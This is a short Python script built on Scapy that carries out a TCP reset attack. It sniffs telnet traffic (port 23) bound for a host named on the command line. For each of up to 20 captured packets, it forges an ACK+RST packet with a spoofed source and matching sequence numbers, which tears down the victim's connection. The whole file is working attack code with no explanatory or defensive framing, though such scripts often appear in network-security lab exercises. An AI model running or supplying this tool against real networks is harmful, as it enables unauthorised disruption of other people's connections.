#!/usr/bin/python
from scapy.all import *
import argparse

def getArguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", dest="target")
	(options) = parser.parse_args()
	return options

def rst_conn(tar_pkt):
	print("Target Packet:\n")
	tar_pkt.show()
	ip = IP(dst=tar_pkt[IP].src, src=tar_pkt[IP].dst)
	tcp = TCP(sport=tar_pkt[TCP].dport, dport=tar_pkt[TCP].sport, flags='AR', seq=tar_pkt[TCP].ack, ack=tar_pkt[TCP].seq + 1)
	rst_pkt = ip/tcp
	print("Rst packrt:\n")
	rst_pkt.show()
	send(rst_pkt, verbose=0)

def findPacket(target):
	pkt = sniff(filter="tcp dst port 23 and dst " + target, prn=rst_conn, count=20)


target = getArguments()
findPacket(target.target)